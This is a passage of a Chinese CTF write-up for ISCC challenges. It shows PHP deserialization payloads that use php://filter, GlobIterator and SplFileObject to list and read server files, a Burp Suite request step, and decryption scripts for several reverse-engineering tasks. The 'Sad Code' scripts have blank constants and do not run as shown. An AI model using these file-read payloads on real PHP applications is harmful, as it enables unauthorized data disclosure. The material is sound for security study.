<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un2</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un3</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un4</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>然后base64解密得到的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;flag在当前目录下以字母f开头的txt中,无法爆破出来&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>目录遍历:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un0</span>=<span class="hljs-string">&#x27;GlobIterator&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un1</span>=<span class="hljs-string">&quot;glob://f*.txt&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un3</span>=<span class="hljs-string">&#x27;unserialize&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un4</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>回显出文件 fA1TE_GRo9rde_OScter5r.txt<br>用SplFileObject读文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un0</span>=<span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un1</span>=<span class="hljs-string">&quot;fA1TE_GRo9rde_OScter5r.txt&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un3</span>=<span class="hljs-string">&#x27;unserialize&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un4</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>回显出flag ISCC{DQnm19dw_SPxQwQsK_21EnFvN}<br>这个题目学会了php伪协议和</p>
<h2 id="爱国敬业好青年-2"><a href="#爱国敬业好青年-2" class="headerlink" title="爱国敬业好青年-2"></a>爱国敬业好青年-2</h2><p>主页面是一个假页面，burpsuite先get方式传入change页面，出现一个open，然后再访问flag页面，post提交 lati&#x3D;116°23′E&amp;langti&#x3D;39°54′N<br>就是flag.</p>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="GetTheTable"><a href="#GetTheTable" class="headerlink" title="GetTheTable"></a>GetTheTable</h2><p>直接上IDA，可以看出到这是一个base58算法。<br><img src="https://img-blog.csdnimg.cn/1c839a4f2b1947b385803b3cca6f9702.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>密文就是ERaQux2sG1yhTracrk1ZrZ6qnc，解出来就是flag。<br>**</p>
<h2 id="Amy’s-Code"><a href="#Amy’s-Code" class="headerlink" title="Amy’s Code"></a>Amy’s Code</h2><p>这是三十二位的程序<br>在main函数中，输入的v4给v3，然后传入sub_4115FF(),<br><img src="https://img-blog.csdnimg.cn/0fe390c9a2c94ac2a576e8bbc20aeadf.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>输入的值都按位异或，之后在传进<br><img src="https://img-blog.csdnimg.cn/6adf12a8a2064f9e87f7070cc137445f.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>根据这里构造出脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">v6=<span class="hljs-string">&#x27;LWHFUENGDJGEFHYDHIGJ&#x27;</span><br>v9=[<span class="hljs-number">149</span>,<span class="hljs-number">169</span>,<span class="hljs-number">137</span>,<span class="hljs-number">134</span>,<span class="hljs-number">212</span>,<span class="hljs-number">188</span>,<span class="hljs-number">177</span>,<span class="hljs-number">184</span>,<span class="hljs-number">177</span>,<span class="hljs-number">197</span>,<span class="hljs-number">192</span>,<span class="hljs-number">179</span>,<span class="hljs-number">153</span>,<span class="hljs-number">140</span>,<span class="hljs-number">175</span>,<span class="hljs-number">146</span>,<span class="hljs-number">105</span>,<span class="hljs-number">157</span>,<span class="hljs-number">104</span>,<span class="hljs-number">184</span>]<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v6)):<br>    <span class="hljs-built_in">str</span>+=<span class="hljs-built_in">chr</span>(v9[i]-<span class="hljs-built_in">ord</span>(v6[i]))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v9)):<br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i])^i)<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>

<h2 id="VigenereLike"><a href="#VigenereLike" class="headerlink" title="VigenereLike"></a>VigenereLike</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>string = [<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>]<br>string2 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 &quot;</span><br><br>dai = <span class="hljs-string">&#x27;rJFsLqVyFKZBHDkIqr5wu LZlu1Eo1pZLommCrv=&#x27;</span>  <span class="hljs-comment"># base64</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(dai)):<br>    <span class="hljs-keyword">if</span> dai[i] <span class="hljs-keyword">in</span> string2:<br>        v = string2.find(dai[i])<br>        v2 = string2.find(string[i % <span class="hljs-number">7</span>])<br>        out = string2[v - v2]<br>        flag += out<br>    <span class="hljs-keyword">else</span>:<br>        flag += dai[i]<br><span class="hljs-built_in">print</span>(flag)<br>flag = base64.b64decode(flag)<br><span class="hljs-built_in">print</span>(flag)<br>flag = <span class="hljs-built_in">list</span>(flag)<br><span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    flag[o] = <span class="hljs-built_in">chr</span>(flag[o] ^ ((o % <span class="hljs-number">7</span>) + <span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag)[:-<span class="hljs-number">4</span>])<br></code></pre></td></tr></table></figure>

<h2 id="How-decode"><a href="#How-decode" class="headerlink" title="How_decode"></a>How_decode</h2><p>在encode里看到了sum&#x3D;0x61c88648，这是xxtea加密，秘钥就是k数组的4位。密文是main函数前面的长串。<br><img src="https://img-blog.csdnimg.cn/f8aefcdbe51a4a9c9feaec28dcf01bfc.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p> 解密算法：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[e^p&amp;3] ^ z)))</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> y, z, sum, t;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)            <span class="hljs-comment">/* Coding Part */</span><br>    &#123;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++)<br>            &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                t = v[p];<br>                t += MX;<br>                z = t;<br><br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>)      <span class="hljs-comment">/* Decoding Part */</span><br>    &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)<br>            &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> v[] = &#123; <span class="hljs-number">0x583A2755</span>,<span class="hljs-number">0x15F437DE</span>,<br><span class="hljs-number">0xEB4BF8AF</span>,<span class="hljs-number">0xD9F98EF2</span>,<br><span class="hljs-number">0x42CCAB39</span>,<span class="hljs-number">0x7A857094</span>,<br><span class="hljs-number">0x912E821D</span>,<span class="hljs-number">0xCD3148B7</span>,<br><span class="hljs-number">0x743BC712</span>,<span class="hljs-number">0x487532A5</span>,<br><span class="hljs-number">0x5A630997</span>,<span class="hljs-number">0x80576CDB</span>,<br><span class="hljs-number">0x11783A4D</span>,<span class="hljs-number">0x73D2C70E</span>,<br><span class="hljs-number">0xD6EE81AC</span>,<span class="hljs-number">0xDAFA0F09</span>,<br><span class="hljs-number">0xAC79A9EC</span>,<span class="hljs-number">0x91F4B9B7</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">73</span>,<span class="hljs-number">83</span>,<span class="hljs-number">67</span>,<span class="hljs-number">67</span> &#125;;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">18</span>; <span class="hljs-comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密</span><br><br>    <span class="hljs-comment">//btea(v, n, k);</span><br>    <span class="hljs-built_in">btea</span>(v, -n, k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">18</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>, v[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="Sad-Code"><a href="#Sad-Code" class="headerlink" title="Sad Code"></a>Sad Code</h2><p>32位ida打开，将里面的内容替换。<br>exp1：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>s = Solver()<br>v16=[Int(<span class="hljs-string">&#x27;v16[%d]&#x27;</span>%i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>)]<br>v15=Int(<span class="hljs-string">&#x27;v15&#x27;</span>)<br>s.add(v16[<span class="hljs-number">1</span>] + <span class="hljs-number">7</span> * v16[<span class="hljs-number">0</span>] - <span class="hljs-number">4</span> * v15 - <span class="hljs-number">2</span> * v16[<span class="hljs-number">2</span>] == )<br>s.add(<span class="hljs-number">5</span> * v16[<span class="hljs-number">2</span>] + <span class="hljs-number">3</span> * v16[<span class="hljs-number">1</span>] - v16[<span class="hljs-number">0</span>] - <span class="hljs-number">2</span> * v15 == )<br>s.add(<span class="hljs-number">2</span> * v16[<span class="hljs-number">0</span>] + <span class="hljs-number">8</span> * v16[<span class="hljs-number">2</span>] + <span class="hljs-number">10</span> * v15 - <span class="hljs-number">5</span> * v16[<span class="hljs-number">1</span>] == )<br>s.add(<span class="hljs-number">7</span> * v15 + <span class="hljs-number">15</span> * v16[<span class="hljs-number">0</span>] - <span class="hljs-number">3</span> * v16[<span class="hljs-number">2</span>] - <span class="hljs-number">2</span> * v16[<span class="hljs-number">1</span>] == )<br>s.add(<span class="hljs-number">15</span> * v16[<span class="hljs-number">3</span>] + <span class="hljs-number">35</span> * v16[<span class="hljs-number">6</span>] - v16[<span class="hljs-number">4</span>] - v16[<span class="hljs-number">5</span>] == )<br>s.add(<span class="hljs-number">38</span> * v16[<span class="hljs-number">5</span>] + v16[<span class="hljs-number">3</span>] + v16[<span class="hljs-number">6</span>] - <span class="hljs-number">24</span> * v16[<span class="hljs-number">4</span>] == )<br>s.add(<span class="hljs-number">38</span> * v16[<span class="hljs-number">4</span>] + <span class="hljs-number">32</span> * v16[<span class="hljs-number">3</span>] - v16[<span class="hljs-number">5</span>] - v16[<span class="hljs-number">6</span>] == )<br>s.add(v16[<span class="hljs-number">3</span>] + <span class="hljs-number">41</span> * v16[<span class="hljs-number">5</span>] - v16[<span class="hljs-number">4</span>] - <span class="hljs-number">25</span> * v16[<span class="hljs-number">6</span>] == )<br><span class="hljs-keyword">if</span> s.check():<br>    <span class="hljs-built_in">print</span>(s.model())<br></code></pre></td></tr></table></figure>

<p>exp2：（exp1运行结果放入exp2之中）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>v16=[<span class="hljs-number">0</span>]*<span class="hljs-number">7</span><br><br><br>v16[<span class="hljs-number">2</span>] = <br>v16[<span class="hljs-number">4</span>] = <br>v15 = <br>v16[<span class="hljs-number">6</span>] = <br>v16[<span class="hljs-number">3</span>] = <br>v16[<span class="hljs-number">1</span>] = <br>v16[<span class="hljs-number">5</span>] = <br>v16[<span class="hljs-number">0</span>] = <br>flag=long_to_bytes(v15)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v16:<br>    flag+=long_to_bytes(i)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h2 id="Ruststr"><a href="#Ruststr" class="headerlink" title="Ruststr"></a>Ruststr</h2><p>Base64解密异或，<br>然后判断大小写再异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python">b = [<br><span class="hljs-number">0x9A</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x9E</span>,<br><span class="hljs-number">0x63</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x73</span>,<br><span class="hljs-number">0xF2</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xAD</span>,<br><span class="hljs-number">0x0B</span>, <span class="hljs-number">0xE2</span><br>]<br>c = [<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0xd9</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0xce</span>,<span class="hljs-number">0x30</span>,<br><span class="hljs-number">0x8c</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x97</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x3e</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x8f</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x9b</span>]<br>m = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    m.append(c[i]^b[i])<br>key = [<span class="hljs-number">0x32</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x63</span>,<br><span class="hljs-number">0x36</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x65</span>,<br><span class="hljs-number">0x63</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x38</span>,<br><span class="hljs-number">0x64</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lll</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">if</span> a&gt;b:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>f = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>        <span class="hljs-keyword">if</span> (lll((key[i]+<span class="hljs-number">0xd0</span>)&amp;<span class="hljs-number">0xff</span>,<span class="hljs-number">0xa</span>) + j +<span class="hljs-number">2</span>)&amp;<span class="hljs-number">0xff</span> == m[i]:<br>            f += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(f)<br>            <span class="hljs-keyword">break</span><br>p = <span class="hljs-built_in">list</span>(f[::-<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppp</span>(<span class="hljs-params">num</span>):<br>    a = num&amp;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> a==<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(p)):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)&lt;=<span class="hljs-built_in">ord</span>(p[i])&lt;=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>):<br>        p[i] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(p[i])^<span class="hljs-number">0x20</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)&lt;=<span class="hljs-built_in">ord</span>(p[i])&lt;=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>):<br>        p[i] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(p[i])^<span class="hljs-number">0x20</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>) &lt;=<span class="hljs-built_in">ord</span>(p[i])&lt;=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;9&#x27;</span>):<br>        a = <span class="hljs-built_in">ord</span>(p[i]) + <span class="hljs-number">1</span><br>        b = <span class="hljs-built_in">ord</span>(p[i]) - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> ppp(<span class="hljs-built_in">ord</span>(p[i])):<br>            p[i] = <span class="hljs-built_in">chr</span>(a)<br>        <span class="hljs-keyword">else</span>:<br>            p[i] = <span class="hljs-built_in">chr</span>(b)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(p)):<br>    <span class="hljs-built_in">print</span>(p[i],end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
